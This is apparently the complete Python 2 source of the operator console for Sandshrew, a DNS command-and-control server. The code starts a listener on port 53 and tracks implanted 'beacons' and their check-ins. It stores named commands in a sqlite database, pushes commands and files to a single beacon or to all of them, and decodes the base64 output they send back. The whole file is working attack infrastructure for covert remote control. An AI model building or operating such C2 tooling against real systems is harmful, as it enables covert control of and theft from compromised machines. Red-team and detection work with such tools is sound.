"""
    Custom python server to handle DNS requests and 
    create custom responses to queries. Used primarily 
    to control DNS Beacons.

    @author Dosh, JRoc
    github.com/doshmajhan/Sandshrew
"""
import threading, sys, sqlite3, time, base64
import server

"""
    Function to start interactive prompt to read commands

"""
def start_prompt():
    port = 53   # Default value
    cmd = ""
    loaded = ""
    s = server.Server(port)
    db = init_db()
    interact = False
    b = 0           # beacon to interact with
    while True:
        try:
            cmd = raw_input("[*] ")
        except (KeyboardInterrupt, SystemExit):
            print ""
            db.close()
            sys.exit()
        
        cmd = cmd.split(" ")
        if len(cmd) == 1:
            if cmd[0] == "start":  # starting server
                s = start_server(port)
            
            elif cmd[0] == "exit":   # shutting server down
                db.close()
                sys.exit()
            
            elif cmd[0] ==  "status":   # check the status of all the servers beacons
                d = check_status(s)
                print "[-] =========================="
                print "[-] ID | STATUS | LAST CHECKIN"
                print "[-] =========================="
                for key in d: print "[-] " + str(key) + "  | " + str(d[key])
            
            elif cmd[0] == "done":      # done interacting with beacon
                interact = False
                b = 0

            elif cmd[0] == "check":     # check to see if beacons have returned anything
                for x in s.beacons:
                    print "[-] Beacon %d returned %d bytes" % \
                    (x.tag, sum(len(i) for i in x.output))

        elif len(cmd) >= 2: 
            if cmd[0] == "port":  # defining port to listen on
                port = int(cmd[1])

            elif cmd[1] == "=":     # defining new command to store
                name = cmd[0]
                newCmd = ' '.join(cmd[2::]) # combine the rest of the array into single string
                s.add_command(name, newCmd, db) # add command to database
            
            elif cmd[0] == "load":  # load defined command into server
                if interact:
                    s.load_command(cmd[1], db, b)  # retrieve command from database
                else:
                    print "[x] Error -- Choose to interact with specific beacon or all beacons"
            
            elif cmd[0] == "file":  # load file to be transfered
                if interact:
                    try:
                        s.f = True
                        s.fName = cmd[1]
                        f = open(s.fName, 'rb')
                        f.seek(0, 2) # go to end of file
                        size = f.tell() # get size of file
                        f.seek(0) # back to start of file
                        f.close()
                        s.fSize = size
                    except IOError:
                        print "[x] Error -- File failed to open"
                else:
                    print "[x] Error -- Choose to interact with specific beacon or all beacons"

            elif cmd[0] == "interact":  # specify what beacon your giving commands to
                interact = True
                if cmd[1] == "all":
                    # send to all beacons
                    s.sendAll = True
                else:                   # send to specified beacon
                    b = int(cmd[1])     # beacon tag
                    for x in s.beacons:
                        if b == x.tag:
                            s.bList += [x]

            elif cmd[0] == "collect":   # collect output from a beacon
                b = int(cmd[1])         # beacon tag
                for x in s.beacons:
                    if b == x.tag:
                        print "[-] Beacon %d: " % (x.tag)
                        for i in x.output:
                            decoded = base64.b64decode(i)    # decode beacons output
                            s.log('beacon', x, "OUTPUT - " + decoded)
                        x.output = []
"""
    Function to conenct to the servers sqlite3 backend

    returns - the newly connected db variable
"""
def init_db():
    db = sqlite3.connect("sandtomb.db")
    c = db.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                    (name TEXT, cmd TEXT)''')
    db.commit()   
    return db


"""
    Function to check the status of the servers beacons
    
    s - the server holding the beacons
    returns list of each beacon and the last time they checked in
"""
def check_status(s):
    t = time.localtime()
    # go through and get the difference of when the beacon checked in till now
    stats = []  # list of current beacon times
    for b in s.beacons:
        temp = ((int(t.tm_min) * 60) + int(t.tm_sec))
        stats += [(temp-b.realtime)]
    
    d = {}
    for b in s.beacons:
        minute = stats[b.tag]/60
        sec = stats[b.tag]%60
        d.update({b.tag : "Alive  | %d minutes %d seconds ago" % (minute, sec)}) # add beacon to dictionary of entries
    return d

"""
    Function to handle the start command.
    Starts server and returns the server object created
    
    port - the port to listen on 

    returns a server object
"""
def start_server(port):
    s = server.Server(port)
    server_thread = threading.Thread(target=s.start)
    server_thread.daemon=True
    try:
        server_thread.start()
        print "[+] Server listening on port %d" % port
    except (KeyboardInterrupt, SystemExit):
        sys.exit()
    return s

"""
    Main program to start the server and receive requests
"""
if __name__ == "__main__":
        print "[+] Starting prompt..."
        start_prompt()
        sys.exit()
